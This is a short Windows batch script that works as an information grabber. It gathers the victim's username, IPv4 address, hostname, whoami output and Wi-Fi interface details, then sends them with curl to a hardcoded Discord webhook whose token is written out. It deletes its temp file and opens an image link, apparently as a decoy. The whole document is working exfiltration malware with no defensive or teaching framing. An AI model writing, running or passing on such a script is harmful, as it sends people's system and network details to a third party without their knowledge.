@echo off
setlocal enabledelayedexpansion
set webhook=https://discord.com/api/webhooks/1335647743674417223/q_JbzXlKBtyaZMSRgGBULKzOceb8PgRmwsoqDqvSvOjTpC7-FTzF4icTlZFSQGRNozVX
for /f "tokens=2 delims=\" %%a in ('whoami') do set username=%%a
echo %username%'s data: > info.txt
echo. >> info.txt
ipconfig | find "IPv4 Address" >> info.txt
echo. >> info.txt
hostname >> info.txt
echo. >> info.txt
whoami >> info.txt
echo. >> info.txt
Netsh WLAN show interfaces >> info.txt
echo. >> info.txt
echo ----------------------------------------- >> info.txt
set message=
for /f "delims=" %%i in (info.txt) do (
    set "line=%%i"
    set "line=!line:"=\"!"
    set "line=!line:\=\\!"
    set "message=!message!!line!\n"
)
del info.txt
set RES=
for /f "tokens=2 delims=" %%i in ("%RES%") do set user=%%i
set "jsonPayload={\"content\": \"!message!\"}"
curl -X POST -H "Content-type: application/json" --data "!jsonPayload!" %webhook%
start https://i.ibb.co/b56R1Yq5/My-banner.png

